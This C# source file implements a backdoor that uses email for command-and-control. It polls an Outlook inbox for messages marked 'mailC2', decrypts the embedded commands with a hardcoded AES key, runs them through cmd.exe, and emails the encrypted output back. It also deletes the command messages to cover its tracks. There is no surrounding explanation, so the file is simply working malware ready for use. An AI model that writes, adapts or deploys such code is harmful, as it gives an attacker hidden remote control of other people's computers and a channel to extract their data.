using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Reflection.Metadata.Ecma335;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MailKit.Net.Imap;
using MailKit.Search;
using MailKit.Security;
using MailKit;
using System.Text.RegularExpressions;
using System.Collections;
using Org.BouncyCastle.Asn1.X509;
using System.Security.Cryptography;
using Org.BouncyCastle.Ocsp;

namespace ConsoleApp1
{
    class Program
    {

        const string fromMail = "xxxxx@outlook.com";
        const string toMail = "yyyyy@outlook.com";
        const string fromPassword = "zzzzzzz";
        const string passPhrase = "7318FBBA5FBE830298BE1790DA22EF7B";
        const string iv = "HR$2pIjHR$2pIj12";

        static string CommondExec(string data) {

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c "+ data;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }
        public static string EncryptByAES(string input, string key, string iv)
        {
            if (string.IsNullOrWhiteSpace(input))
            {
                return input;
            }
            using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.Mode = CipherMode.CBC;
                rijndaelManaged.Padding = PaddingMode.PKCS7;
                rijndaelManaged.FeedbackSize = 128;
                rijndaelManaged.Key = Encoding.UTF8.GetBytes(key);
                rijndaelManaged.IV = Encoding.UTF8.GetBytes(iv);
                ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(input);
                        }
                        byte[] bytes = msEncrypt.ToArray();
                        return Convert.ToBase64String(bytes);
                    }
                }
            }
        }
        /// <summary>  
        /// AES解密  
        /// </summary>  
        /// <param name="input">密文字节数组</param>  
        /// <returns>返回解密后的字符串</returns>  
        public static string DecryptByAES(string input, string key, string iv)
        {
            if (string.IsNullOrWhiteSpace(input))
            {
                return input;
            }
            var buffer = Convert.FromBase64String(input);
            using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.Mode = CipherMode.CBC;
                rijndaelManaged.Padding = PaddingMode.PKCS7;
                rijndaelManaged.FeedbackSize = 128;
                rijndaelManaged.Key = Encoding.UTF8.GetBytes(key);
                rijndaelManaged.IV = Encoding.UTF8.GetBytes(iv);
                ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
                using (MemoryStream msEncrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srEncrypt = new StreamReader(csEncrypt))
                        {
                            return srEncrypt.ReadToEnd();
                        }
                    }
                }
            }
        }


        static void SendEmail(string mailSubject, string mailBody, string attachPath="")
        {
      

            using (
            MailMessage message = new MailMessage
            {
                To = { new MailAddress(toMail, "Jack") },
                Sender = new MailAddress(fromMail, "Alex"),
                From = new MailAddress(fromMail, Environment.MachineName),
                Subject = mailSubject,
                SubjectEncoding = Encoding.UTF8,
                Body = mailBody,
                BodyEncoding = Encoding.UTF8,
                IsBodyHtml = true,
            }
            
         )
            {
                if (attachPath != "")
                {
                    message.Attachments.Add(new Attachment(attachPath));
                }
                
                using (
                   SmtpClient smtp = new SmtpClient
                   {
                       Host = "smtp.office365.com",
                       Port = 587,
                       Credentials = new System.Net.NetworkCredential(fromMail, fromPassword),
                       EnableSsl = true,          
                   }
         
                )
                {
                    try {
            
                        smtp.Send(message);

                    }
                    catch (Exception excp)
                    {
                        Console.Write(excp.ToString());
                        
                    }
                }
            }
        }


        static void GetMail(string fromMail,string fromPassword) 
        {
            using (var client = new ImapClient())
            {
                client.Connect("smtp-mail.outlook.com", 993, SecureSocketOptions.SslOnConnect);
                client.Authenticate(fromMail, fromPassword);
                client.Inbox.Open(FolderAccess.ReadWrite);

                //var uids = client.Inbox.Search(SearchQuery.All);
                var query = SearchQuery.SubjectContains("mailC2");
                var uids = client.Inbox.Search(query);
                foreach (var uid in uids)
                {
                    var message = client.Inbox.GetMessage(uid);

                    var orainData = DecryptByAES(message.TextBody, passPhrase, iv);
                    Console.WriteLine(orainData);
                    string pattern = string.Format("{0}(.*){1}", "<command>", "</command>");
                    Regex rgx = new Regex(pattern);

                    foreach (Match match in Regex.Matches(orainData, pattern))
                    {
                        Console.WriteLine(match.Groups[1].Value);
                       
                        string result = CommondExec(match.Groups[1].Value);

                        var AESdata= EncryptByAES(result, passPhrase, iv);
                        Console.WriteLine(AESdata);

                        //string filePath = @"C:\download\CodeFormer-master\assets\CodeFormer_logo.png";//添加附件
                        SendEmail("mailC2", AESdata, "");


                    }
                    client.Inbox.AddFlags(uid, MessageFlags.Deleted, true);

                }

                client.Inbox.Expunge();
                client.Disconnect(true);
            }
        }

        
        static void Main(string[] args)
        {

            while (true) {
                GetMail(fromMail, fromPassword);
                Thread.Sleep(900000);

            }
        }
    }
}